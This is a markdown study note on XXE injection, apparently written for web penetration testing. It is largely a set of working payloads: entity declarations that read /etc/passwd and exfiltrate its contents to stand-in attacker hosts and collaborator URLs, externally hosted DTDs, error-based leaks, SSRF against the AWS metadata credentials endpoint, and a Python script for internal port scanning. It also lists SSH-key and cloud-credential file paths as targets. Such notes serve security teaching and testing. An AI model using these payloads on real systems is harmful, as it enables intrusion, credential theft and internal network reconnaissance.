---
created: 2026-05-07
tags:
  - web_hacking
status: substantial
---
## XXE

>**(XML External Entity (XXE) injection** is a security vulnerability that allows an attacker to interfere with an application's processing of XML data by exploiting an XML parser's native capacity to resolve external entity declarations.

- At its core, XXE exploits the XML parser's ability to process and evaluate *external entities* — references to external resources like files or network endpoints.

- Two conditions must hold for XXE to be exploitable:
	- **User-controlled XML reaches the parser**
		- The application accepts user-controlled XML input — via a `POST` body, file upload, SOAP API, or JSON API internally converted to XML — without proper validation.
	- **The parser resolves external entities**
		- The parser follows `SYSTEM` or `PUBLIC` URIs in entity declarations and fetches the resource; the application may or may not reflect the results in response.

- When both conditions hold, you can inject a custom **DTD (Document Type Definition)** — `DOCTYPE` — with an external entity declaration.
- The parser expands the entity by fetching the referenced resource (local file or network endpoint) and substituting its content wherever the entity is referenced.

>[!example]-
>- Suppose application JavaScript transmits request parameters in XML format:
> 
> ```XML
> <user> 
> 	<name>John</name> 
> </user>
> ```
> - The `name` parameter value (e.g., `John`) is reflected in the response
>- To test for XXE, inject a test DTD with an internal XML entity declaration:
> 
> ```XML
> <?xml version="1.0"?>
> <!DOCTYPE test [
>   <!ENTITY testEntity "XXE-TEST">
> ]>
> <user>
>   <name>&testEntity;</name>
> </user>
> ```
>- Instead of `John`, you see `XXE-TEST` in the application response; this means the application expanded internal entity and replaced a reference to it with its value. 
> - Inject an external entity resolving to `/etc/hostname`:
> ```XML
> <?xml version="1.0"?>
> <!DOCTYPE test [
>   <!ENTITY ext SYSTEM "file:///etc/hostname">
> ]>
> <user>
>   <name>&ext;</name>
> </user>
> ```
> 
>- If the response contains the hostname of the target server, this means the XML parser process **XML external entities**.
>- You can use this to retrieve other files (out-of-band — because XML parser may not handle all characters for display gracefully):
> ```XML
> <?xml version="1.0"?>
> <!DOCTYPE data [
>   <!ENTITY % file SYSTEM "file:///etc/passwd">
>   <!ENTITY % data SYSTEM "http://<attacker_ip_address>:8000/?data=%file;">
>   <!ENTITY % exfil SYSTEM "%data;">
>   %exfil;
> ]>
> <root>&exfil;</root>
> ```
> 
> The XML parser on the server reads the `/etc/passwd` file, and includes its content in the `data` parameter of an HTTP `GET` request it sends to your controlled endpoint, `http://<attacker_ip_address>:8000`. To get the data, check your server logs.
### Impact

- Impact of an XXE injection vulnerability primarily depends on XML parser configuration on the server. Potential consequences of successful exploitation include:

- **Local File Inclusion (LFI)**
	-  XXE often leads to **arbitrary file read**. If an XML parser can read local files via the `file://` schema, an attacker can retrieve sensitive files from the server's filesystem, such as configuration files, source code, SSH keys, or system files like `/etc/passwd`.

- **SSRF (Server-Side Request Forgery)**
	- External entities can be used to make arbitrary HTTP(S) requests, which can be exploited in SSRF attacks.
	- Because these requests originate from the server itself, they bypass firewall restrictions and can access internal endpoints that are normally unreachable from the Internet, such as cloud metadata endpoints, internal APIs, or services running withing the local network.
	- See [[SSRF]].

- **DoS (Denial of Service)**
	- Through nested entity definitions, it is possible to cause exponential entity expansion which can exhaust server memory and lead to Denial of Service. Famous examples include the **Billion Laughs** and **Quadratic blowup** attacks.

- **RCE (Remote Code Execution)**
	- Under certain conditions, it is possible to escalate XXE to remote code execution, such as with PHP wrappers, or combined with Java deserialization, or in case of SSH key theft. 

>[!important] XXE exploitation largely depends on the XML parser in use.
> 
> - **Most Java XML parsers process of XML external entities by default.** This is why Java-based applications are especially vulnerable to XXE attacks.
> - Microsoft's .NET framework has XXE processing disabled in recent versions, but legacy application may still be vulnerable.
> - PHP 8.0 versions and newer prevent XXE by default when using the default parser. For versions prior to 8.0, it's enable by default, but can be disabled by setting `libxml_set_external_entity_loader(null);`.
> - Most Python XML parsers disable XML external entities by default, but they're still vulnerable to DoS through the [[#Billion Laughs]] and [[#Quadratic blowup]] attacks.
> 
> See [`XML External Entity Prevention Cheat Sheet — OWASP Cheat Sheet Series`](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) for more about XXE vulnerability in different XML parsers and how to mitigate it.

## Background: XML, DTDs, and Entities

### Document Type Definitions

> **A Document Type Definition (DTD)** is a schema embedded in or referenced by an XML document that defines the document's allowed structure, including its elements, attributes, and entities. A parser *may* use the DTD to validate the document and to resolve entity references during parsing.

- DTDs are declared with the `DOCTYPE` directive:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rootElement [
    <!-- DTD declarations -->
]>
<rootElement>
    <!-- XML content -->
</rootElement>
```

- The `DOCTYPE` declaration appears after the optional XML declaration (`<?xml ... ?>`) and before the root element.

- A DTD can be:
	- **Internal** — embedded directly inside the `DOCTYPE`.
	- **External** — loaded from a local file or remote URL via `SYSTEM` or `PUBLIC`.
	- **Hybrid** — combines an external DTD with additional internal declarations.

>[!example]+
> ```XML
> <!-- external DTD -->
> <!DOCTYPE content SYSTEM "http://attacker.com/evil.dtd">
> 
> <!-- hybrid DTD -->
> <!DOCTYPE content SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd" [
>     <!ENTITY % customEntity "...override...">
> ]>
> ```

### XML entities

> **An XML entity** is a reusable named value defined in a DTD. When the parser encounters an entity reference, it replaces the reference with the entity's value during XML processing.

- XML includes several predefined entities for reserved characters:
	- `&lt;` → `<`
	- `&gt;` → `>`
	- `&amp;` → `&`
	- `&apos;` → `'`
	- `&quot;` → `"``

- Entities are divided into twp main types:
	- **Generic entities** — referenced inside XML document content; syntax: `&entity;`.
	- **Parameter entities** — referenced only inside the DTD; syntax: `%entity;`
- Each type can be either internal or external. 

---

- **Internal general entity** (`&entity;`) — Defined directly in the DTD; referenced in the XML document body:
	
	```XML
	<?xml version="1.0" standalone="yes"?>
	<!DOCTYPE note [
	  <!ENTITY name "Alice">
	]>
	<note>&name;</note>
	```

- **External general entity** (`&entity;`) — Loaded from a file or URL via `SYSTEM` or `PUBLIC`; referenced in the XML document body:

```XML
<!-- local file -->
<!DOCTYPE note [
    <!ENTITY msg SYSTEM "file:///tmp/message.txt">
]>
<note>&msg;</note>
```

```XML
<!-- remote URL -->
<!DOCTYPE note [
  <!ENTITY msg SYSTEM "https://example.com/message.txt">
]>
<note>&msg;</note>
```

- **Internal parameter entity** (`%entity;`) — Defined in the DTD; used *only inside the DTD* (not in document content):

```XML
<!DOCTYPE note [
  <!ENTITY % tag "note">
  <!ELEMENT %tag; (#PCDATA)> <!-- expands to <!ELEMENT note (#PCDATA)> -->
]>
<note>Hello</note>
```

- **External parameter entity** (`%entity;`) — Loaded from a file or URL via `SYSTEM` or `PUBLIC`; used *only inside the DTD*:

```XML
<!DOCTYPE note [
  <!ENTITY % defs SYSTEM "defs.dtd">
  %defs;
]>
<note>Hello</note>
```
#### `SYSTEM` vs. `PUBLIC`

- External entities can be declared using either `SYSTEM` or `PUBLIC`.

```XML
<!ENTITY ext SYSTEM "http://attacker.com/test.txt">
<!ENTITY ext PUBLIC "id" "http://attacker.com/test.txt">
```

- `SYSTEM` specifies a direct system identifier (typically a URI).
- `PUBLIC` includes a public identifier plus a URI fallback.

From an exploitation perspective, both work identically;. In some cases, `PUBLIC` declarations may bypass naive filters that only block the `SYSTEM` keyword.

#### URI schemes in external entities

- Supported URI schemes depend on the parser and runtime environment. Common examples include:
	- `file:///` — Read local files.
	- `http://` / `https://` — Trigger outbound HTTP requests (SSRF).
	- `ftp://` — Alternate outbound channel; useful for OOB exfiltration.
	- `gopher://` — Useful for raw protocol interaction on some systems.
	- `php://filter/...` — PHP stream wrapper tricks (for example Base64 encoding).
	- `expect://` — Command execution via the PHP Expect extension (rare).
	- `jar://`, `netdoc://` — Java-specific handlers.
#### XML `standalone` attribute

The XML declaration may contain a `standalone` attribute:

```XML
<?xml version="1.0" standalone="yes"?>
```

- `standalone="yes"` — Declares that the document does not rely on external markup declarations.
- `standalone="no"` — Indicates external declarations may be required; the default value.

`standalone` does **not** reliably prevent external entity resolution. Actual behavior depends on the XML parser implementation and its security configuration. Many parsers ignore the attribute entirely.

### CDATA sections

> A **CDATA section** (`<![CDATA[...]]>`) instructs the parser to treat enclosed content as literal character data instead of XML markup.

- Inside a CDATA section, characters such as `<`, `>`, and `&` are not interpreted as XML syntax.

```XML
<![CDATA[
<xml>This is treated as text</xml>
]]>
```

- CDATA becomes relevant in XXE exploitation when you need to retrieve a file that contains XML special characters that would otherwise break parsing.

>[!important] Everything between `<![CDATA[` and `]]>` is treated literally.

>[!warning] CDATA sections **can't contain the sequence `]]>`**, because it terminates the section.

### Parser Behavior by Platform

The degree of XXE exposure depends heavily on the XML parser in use:

- **Java (Xerces, etc.)** — External entity resolution is **enabled by default**; Java-based applications are the most consistently exploitable XXE targets.
- **PHP (`libxml` < 8.0)** — older versions allowed external entity resolution by default; modern versions (PHP 8.0+) are more restrictive.
- **.NET** — Modern parsers generally disable external entity resolution by default, though legacy configurations remain vulnerable.
- **Python (`lxml`, `ElementTree`)** — External entities are typically disabled by default, but entity expansion DoS may still be possible.
- **Ruby (`Nokogiri`)** — External entity expansion is disabled by default since version 1.5.4.

> [!note] The [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) documents parser-specific mitigation steps for each for the platforms mentioned above. You can use it to evaluate target's security posture during an assessment.

## Attack surface

>[!important] XXE vulnerabilities only exist where XML reaches a parser.

- XML is heavily used in web services and APIs that need to exchange structured data:
	- **[SOAP (Simple Object Access Protocol)](https://en.wikipedia.org/wiki/SOAP)** uses XML to transport data.
	- **[REST (Representational State Transfer)](https://en.wikipedia.org/wiki/REST) APIs** may serialize data as XML (`Content-Type: application/xml` or `text/xml`).
	- **[RSS (RDF Site Summary or Really Simple Syndication)](https://en.wikipedia.org/wiki/RSS)** uses XML to distribute news feeds and blog updates.
	- **[XHTML (Extensible HyperText Markup Language)](https://en.wikipedia.org/wiki/XHTML)** is part of the family of XML markup languages that extends HTML.
	- **[SVG (Scalable Vector Graphics)](https://en.wikipedia.org/wiki/SVG)** is an XML-based vector image format widely used on the web.
	- **[AJAX (Asynchronous JavaScript and XML)](https://en.wikipedia.org/wiki/Ajax_(programming)** is one of the most common ways to exchange data asynchronously in web requests, and it often uses XML for data serialization.
	- **[XMPP (Extensible Messaging and Presence Protocol)](https://en.wikipedia.org/wiki/XMPP)** is an XML-based protocol for instant messaging.
	- **Configuration files** used by web servers (e.g., [Apache](https://en.wikipedia.org/wiki/Apache_HTTP_Server)), applications, and frameworks to store settings are often formatted as XML documents.

>[!tip]+ XML MIME types
> ```
> application/xml
> text/xml
> application/xml-external-parsed-entity
> text/xml-external-parsed-entity
> application/xml-dtd
> image/svg+xml
> ```

XML processing points include:

- **API and web application endpoints**:
	- REST APIs that use XML (`application/xml`, `text/xml`, etc.  ). 
	- SOAP APIs (often legacy systems).
	- [XML-RPC](https://en.wikipedia.org/wiki/XML-RPC) endpoints.
	- [SAML](https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language) authentication systems (SSO)
	- [RSS](https://en.wikipedia.org/wiki/RSS)/[Atom](https://en.wikipedia.org/wiki/Atom_(web_standard)) feed processors and aggregators.
	- API import/export features.
	- Configuration file uploads.

- **XML-based file formats**:
	- XML documents: `.xml`
	- Office documents:
		- Word: `.docx`, `.docm`
		- Excel: `.xlsx`, `.xlsm`
		- PowerPoint: `.pptx`, `.pptm`
	- Templates and ad-ins: `.dotx`, `.dotm`, `.xltx`, `.xltm`, `.potx`, `.potm`, `.ppam`, etc.
	- ODF (OpenDocument Format, used by LibreOffice and OpenOffice): `.odt`, `.ods`, `.odp`.
	- Scalable Vector Graphics (SVG): `.svg`
	- XHTML documents: `.xhtml`
	- MathML: `.mathml`
	- 3D graphics: `.x3d`
	- Specialized formats: `.gpx` (GPS data), `.dae` (3D models), `.rss` (RSS), `.atom` (Atom), etc.
	- etc.

| Format                   | Extensions                                                    |
| ------------------------ | ------------------------------------------------------------- |
| Generic XML              | `.xml`                                                        |
| Microsoft Office (OOXML) | `.docx`, `.docm`, `.xlsx`, `.xlsm`, `.pptx`, `.pptm`          |
| Office templates/add-ins | `.dotx`, `.dotm`, `.xltx`, `.xltm`, `.potx`, `.potm`, `.ppam` |
| OpenDocument Format      | `.odt`, `.ods`, `.odp`                                        |
| Scalable Vector Graphics | `.svg`                                                        |
| XHTML                    | `.xhtml`                                                      |
| MathML                   | `.mathml`                                                     |
| 3D graphics              | `.x3d`, `.dae`                                                |
| GPS data                 | `.gpx`                                                        |
| Syndication              | `.rss`, `.atom`                                               |
> [!note]- XML file extension list for fuzzing
> 
> ```
> .xml  
> .docs  
> .docm  
> .xlsx  
> .xlsm  
> .pptx  
> .pptm  
> .dotx  
> .dotm  
> .xltm  
> .potx  
> .potm  
> .ppam  
> .odt  
> .ods  
> .odp  
> .svg  
> .xhtml  
> .mathml  
> .x3d  
> .gpx  
> .dae  
> .rss  
> .atom
> ```

>[!note] See [[File upload]].

- Some less obvious XML processing paths:
	- Applications that *accept JSON* but *internally convert it to XML* before processing.
	- Web frameworks with middleware that transparently parses XML request bodies.
	- PDF generators that accept XML-formatted template input.
	- Database features: MySQL `LOAD XML`, PostgreSQL XML parsing functions.
	- Java and .NET functions that deserialize XML-encoded objects.
	- Some applications accept XML in URL parameters, though this is less common.

>[!tip]+ Some applications support **multiple formats**. Sometimes, changing `Content-Type` to `application/xml` may cause the application to switch parsers.

> [!note] OOXML formats (`.docx`, `.xlsx`, etc.) are ZIP archives that *contain* XML files. If the server extracts and parses these server-side — for document preview, conversion, or indexing — each embedded XML file is a potential XXE injection point.

> [!important]+ XML MIME types
> - `application/xml` — Standard XML.
> - `text/xml` — Legacy XML content type.
> - `application/soap+xml` — SOAP web services.
> - `application/xhtml+xml` — XHTML documents.
> - `image/svg+xml` — SVG graphics.
> - `application/rss+xml` — RSS feeds.
> - `application/atom+xml` — Atom feeds.
> -  `application/xml-external-parsed-entity` (`text/xml-external-parsed-entity` is an alias).
> - `application/xml-dtd` (for DTDs).
> 
> ```
> application/xml    
> text/xml    
> application/soap+xml    
> application/xhtml+xml    
> image/svg+xml    
> application/rss+xml    
> application/atom+xml
> ```
> 

- Indicators of XML processing:
	- Responses formatted as XML (start with `<?xml` or contain XML tags).
	- Error messages referencing XML parsing — these may expose parser type, version, and configuration.
	- Responses that reflect submitted input back in an XML-structured body.
	- SOAP faults or XML validation errors in response to malformed input.

 >[!tip]+ Use fuzzing to detect and confirm XXE injection
>- [`SecLists/Fuzzing/XXE-Fuzzing.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)
>- [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list?tab=readme-ov-file)
## Confirming entity expansion

- Use an **internal entity** to confirm expansion: 

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe "XXE-CANARY">
]>
<root>
  <field>&xxe;</field>
</root>
```

- If `XXE-CANARY` appears in the response, the parser expands entities — proceed to external entities.

>[!example]- Example: Worked example against a form submission
> Suppose an application sends your form data in XML format:
> 
> ```HTTP
> POST /api/submit_data HTTP/1.1
> Host: example.com
> Content-Length: 142
> Accept-Language: en-US,en;q=0.9
> Content-Type: text/xml;charset=UTF-8
> ...
> ```
> ```XML
> <?xml version="1.0" encoding="UTF-8"?>
> <root>
> 	<name>Name</name>
> 	<tel></tel>
> 	<email>example@email.com</email>
> 	<message>message</message>
> </root>
> ```
> 
> - To test for XXE, inject `DOCTYPE` declaration repeat the request:
> 
> ```XML
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE test [
>   <!ENTITY testEntity "XXE-TEST">
> ]>
> <root>
> 	<name>&testEntity;</name>
> 	<tel></tel>
> 	<email>example@email.com</email>
> 	<message>message</message>
> </root>
> ```

>[!note]+ No reflection ≠ no vulnerability
>- If the expanded entity doesn't appear in response, this doesn't rule out the vulnerability — you might be dealing with blind XXE injection. Try out-of-band (OOB) techniques (see [[#Blind XXE injection via OOB interaction]]).
## In-band file read (LFI)

- Test for external entity expansion against a local file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
  <field>&xxe;</field>
</root>
```

- For initial test probes, it's best to choose files with no newlines and special characters, such as `/etc/hostname`.

>[!tip]+ To bypass filters, try using `PUBLIC` instead of `SYSTEM`.

- Attempt to read a file with newlines or special characters:

```xml
<!ENTITY ext SYSTEM "file:///etc/passwd">
```

 >[!tip]+ Use fuzzing to detect and confirm XXE injection
>- [`SecLists/Fuzzing/XXE-Fuzzing.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)
>- [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list?tab=readme-ov-file)

#### Handling special characters — CDATA or PHP filter

- Files containing characters that have special meaning in XML (e.g., `<`, `>`, `&`) break direct substitution. 
- Two possible solutions:
	- **`php://filter` with Base64 encoding** (PHP targets only) 
	- **CDATA wrapping via an externally-hosted DTD**
##### `php://filter` with Base64 encoding

- The `php://filter` wrapper applies a transformation to the input stream, and can be used to Base64-encode file content before it reaches the XML parser (`convert.base64-encode`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <data>&file;</data>
</root>
```

- The response will contain a Base64 string. Decode it locally:

```bash
echo -n "BASE64STRING" | base64 -d
```

>[!note] This method only works on PHP servers with `php://` enabled.
##### CDATA wrapping via an externally-hosted DTD

For non-PHP environments, you can use XML's **CDATA (Character Data)** section to handle special characters.

- Host a DTD on your HTTP server:

```xml
<!-- xxe.dtd -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY joined "%start;%file;%end;">
```

- Inject a DTD that references the DTD you serve:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root>
  <data>&joined;</data>
</root>
```

- The parser fetches the DTD on your server, defines parameter entities (`start`, `file`, `end`), and constructs `&joined;` as `<![CDATA[` + file contents + `]]>`. 
- CDATA causes the parser to treat file content as raw character data and not as part of XML.
#### Files worth enumerating

- Once you confirm LFI check which files you can access:

	- `/etc/passwd`: User accounts, UID/GID mapping.
	- `/etc/hosts`: Internal network names.
	- `/etc/hostname`: Hostname (no newlines; safe for XML).
	- `/proc/self/environ`: Process environment variables (may contain secrets, paths).
	- `/proc/self/cmdline`: Command line of the current process.
	- `/proc/net/tcp`: Active TCP connections.
	- `/proc/net/fib_trie`: Routing table.
	- `/var/log/apache2/access.log`: Apache access logs.
	- `/var/www/html/config.php`: PHP application configuration (database credentials).
	- `/home/<user>/.ssh/id_rsa`: SSH private keys.
	- `/root/.ssh/id_rsa`: Root SSH private key.
	- `~/.aws/credentials`: AWS access keys.
	- `/etc/shadow`: Password hashes (requires root-level process).
	- `/root/.bash_history`: Command history (requires root-level process).


```powershell
/etc/passwd
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/net/tcp
/proc/net/fib_trie
/var/log/apache2/access.log
/var/www/html/config.php
/home/<user>/.ssh/id_rsa
/root/.ssh/id_rsa
~/.aws/credentials
/etc/shadow
/root/.bash_history
```

- On Windows:
	
	- `C:\Windows\System32\drivers\etc\hosts` — Internal network names.
	- `C:\inetpub\wwwroot\web.config` — IIS server configuration file (XML).
	- `C:\Windows\win.ini` — Legacy windows configuration file.
	- `C:\Users\<user>\.ssh\id_rsa` — SSH private keys.

```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\win.ini
C:\Users\<user>\.ssh\id_rsa
```

>[!tip] Fuzz files using LFI wordlists
> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
> - [`seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt)
> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt) (Windows)

## Blind XXE injection via OOB interaction

- When the application does **not** reflect entity content in the response, use OOB techniques to confirm the vulnerability and extract data.
### Confirming vulnerability using DNS queries

- Confirm XXE injection vulnerability via DNS callback to your controlled domain:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://<collaborator_id>.oastify.com">
]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

- If the parser restricts general entities, try **parameter entities** (`%`) instead:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
	<!ENTITY % xxe SYSTEM "http://<collaborator_id>.oastify.com"> 
	%xxe; 
]>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

### Extracting file contents via OOB HTTP

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25;oob SYSTEM 'http://<collaborator_id>.oastify.com/?data=%file;'>">
  %eval;
  %oob;
]>
<root><field>trigger</field></root>
```

>[!note]- Payload breakdown
> - `%file` reads `/etc/passwd` into a parameter entity.
> - `%eval`'s **value** is a _string_ that itself looks like an entity declaration for `%oob`. 
> 	- The `%` inside that string is written as `&#x25;` because a literal `%` there would be parsed as a parameter-entity reference rather than a literal character.
> - Referencing `%eval;` makes the parser inject that declaration into the DTD, effectively defining `%oob`.
> - Referencing `%oob;` makes the parser request `http://http://<collaborator_id>.oastify.com/?data=<passwd contents>`. You should see the URL-encoded data in your logs (most parsers, especially Java, `libxml`, etc., automatically URL-encode inserted data to create a valid HTTP request).

#### Newlines

- Files with newlines may cause the URL to break. 
- Two possible solutions:
	- **`php://filter` with Base64 encoding**
	- **FTP instead of HTTP**

- If these don't work, target single-line files as a fallback.
##### `php://filter` with Base64 encoding

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25;oob SYSTEM 'http://<collaborator_id>.oastify.com/?data=%file;'>">
  %eval;
  %oob;
]>
<root><field>trigger</field></root>
```

- Decoding listener:

```php
<?php
if (isset($_GET['data'])) {
    error_log("\n\n" . base64_decode($_GET['data']));
}
?>
```

```bash
php -S 0.0.0.0:8000
```
##### FTP instead of HTTP

- FTP doesn't have HTTP's URL newline restrictions. Some parsers support `ftp://`:

```xml
<!ENTITY % oob SYSTEM "ftp://<attacker_ip_address>:21/?data=%file;">
```

- You will need an FTP listener to capture the connection:

```bash
nc -lvnp 21
```
### OOB via external DTD

- Some parsers reject nested parameter entity declarations inside the **internal** DTD subset. Host an **external** DTD on your server instead:

```xml
<!-- xxe.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://<attacker_ip_address>:8000/?data=%file;'>">
```

- Reference your DTD in the payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://<attacker_ip_address>:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>
  <field>&exfil;</field>
</root>
```

- `%remote;` loads the external DTD from your server; `%oob;` brings the `exfil` general entity declaration into scope; `&exfil;` in the body triggers the HTTP request carrying the file contents.
## Error-based exfiltration

When output connections are blocked, you can try extracting data via error messages.

- Deliberately reference a non-existent path that _embeds_ the target file's contents, and let the parser's own error message leak it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25;error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root><field>trigger</field></root>
```

>[!note]- Payload breakdown
> - `%file` reads `/etc/passwd` into a parameter entity.
> - `%eval` defines `%error` as a reference to `file:///nonexistent/<passwd contents>`.
> - Resolving `%error;` fails — but the error may read like: `java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash...`
> - If that error is returned to the client, the file content is visible in the error text.

- This works best against Java-based parsers which produce verbose, path-inclusive exceptions. Good fallback when OOB connections are firewalled outbound.
## SSRF via XXE

>[!note] See [[SSRF]].

- External entity resolution via `http://`/`https://` may force the **server** issue requests to internal resources (otherwise unreachable from the Internet) and sometimes arbitrary external domains — then possibly return the response to you. This bypasses most perimeter firewalls that only block inbound connections.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <field>&ssrf;</field>
</root>
```

- Valuable internal targets to check:

| Target                                                              | Purpose                                                  |
| ------------------------------------------------------------------- | -------------------------------------------------------- |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Cloud (AWS) instance credentials                         |
| `http://localhost/server-status`                                    | Apache status                                            |
| `http://localhost:8080/manager/html`                                | Tomcat Manager                                           |
| `http://127.0.0.1:9200/`                                            | Elasticsearch                                            |
| `http://127.0.0.1:6379/`                                            | Redis (protocol mismatch may still confirm reachability) |
| `http://127.0.0.1:2375/`                                            | Docker daemon API                                        |

- Check if you can cause requests to arbitrary external domains:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://<collaborator_id>.oastify.com">
]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
### Blind internal port scanning

- Even if the application doesn't give any explicit output, response timing and content differences between open, closed, and filtered ports may allow blind port scanning of internal hosts:

```python
import requests
import time

target = "https://example.com/api/xml"
internal_ip = "192.168.1.100"
ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]

for port in ports:
    payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{internal_ip}:{port}/">
]>
<root>&xxe;</root>'''

    try:
        t0 = time.time()
        resp = requests.post(target, data=payload, timeout=10,
                             headers={"Content-Type": "application/xml"})
        elapsed = time.time() - t0

        body = resp.text.lower()
        if "connection refused" in body:
            status = "CLOSED"
        elif elapsed > 8:
            status = "FILTERED (timeout)"
        else:
            status = f"OPEN ({elapsed:.2f}s)"

        print(f"[{port}] {status}")

    except requests.Timeout:
        print(f"[{port}] FILTERED (timeout)")
    except Exception as e:
        print(f"[{port}] ERROR: {e}")
```

 - Open ports typically return quickly with some application-level content or a service-specific error; closed ports return `Connection refused` almost instantly; filtered ports time out. The pattern is parser-dependent; Java parsers tend to give the most informative errors here.
## XXE via file upload

File-upload endpoints are a distinct attack surface from JSON/XML API bodies — the parser is often part of a media-processing library (such as for generating thumbnails/previews or converting file formats) rather than the main application parser, and may have different (weaker) defaults.

- **SVG** is valid XML commonly processed server-side:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text></svg>
```

- **OOXML (`.docx`/`.xlsx`/`.pptx`)** are ZIP archives of XML parts. If they are parsed and processed by the application, inject your `DOCTYPE` into an internal part (such as `docProps/core.xml` or `word/document.xml`), the zip again and upload. 

>[!note] This only works if the _server-side_ processor parses the XML with entity resolution enabled — desktop Word/Excel/PowerPoint will not process attacker-controlled DTDs on open.

- You may find XXE injection possibilities in different file formats:

| Format                   | Extensions                                                    |
| ------------------------ | ------------------------------------------------------------- |
| Generic XML              | `.xml`                                                        |
| Microsoft Office (OOXML) | `.docx`, `.docm`, `.xlsx`, `.xlsm`, `.pptx`, `.pptm`          |
| Office templates/add-ins | `.dotx`, `.dotm`, `.xltx`, `.xltm`, `.potx`, `.potm`, `.ppam` |
| OpenDocument Format      | `.odt`, `.ods`, `.odp`                                        |
| Scalable Vector Graphics | `.svg`                                                        |
| XHTML                    | `.xhtml`                                                      |
| MathML                   | `.mathml`                                                     |
| 3D graphics              | `.x3d`, `.dae`                                                |
| GPS data                 | `.gpx`                                                        |
| Syndication              | `.rss`, `.atom`                                               |

> [!note]- XML file extension list for fuzzing
> 
> ```
> .xml  
> .docs  
> .docm  
> .xlsx  
> .xlsm  
> .pptx  
> .pptm  
> .dotx  
> .dotm  
> .xltm  
> .potx  
> .potm  
> .ppam  
> .odt  
> .ods  
> .odp  
> .svg  
> .xhtml  
> .mathml  
> .x3d  
> .gpx  
> .dae  
> .rss  
> .atom
> ```

>[!note] See [[File upload]].

## XInclude injection

>**XInclude** (`<xi:include>`) is a W3C specification (`http://www.w3.org/2001/XInclude`) that allows an XML document to assemble itself from sub-documents. 

- If the parser supports XInclude and untrusted input reaches it, this achieves XXE-equivalent **without a `DOCTYPE`**.

```xml
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

- `parse="text"` includes the resource as raw character data. Omit it and the processor tries to parse the file as XML (usually fails on non-XML files).

>[!important] `XInclude` attacks do not require injecting a `DOCTYPE` declaration.

